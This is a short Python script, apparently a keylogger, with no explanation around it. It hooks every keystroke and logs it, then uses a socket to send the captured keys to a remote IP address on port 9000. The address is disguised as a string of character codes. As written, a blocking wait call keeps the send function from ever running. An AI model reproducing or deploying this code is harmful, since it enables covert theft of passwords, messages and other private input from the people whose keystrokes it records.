import keyboard
import socket

def on_press(key):
    global logs
    logs += str(key) + "\n"
    print(f"Key {key} pressed")

def send_logs():
    ip = ''.join(chr(int(x)) for x in '49 50 56 46 49 54 56 46 49 50 50 46 49 56 50'.split())
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, 9000))
    s.sendall(logs.encode('utf-8'))
    s.close()

logs = ''
keyboard.hook(on_press)
keyboard.wait()
send_logs()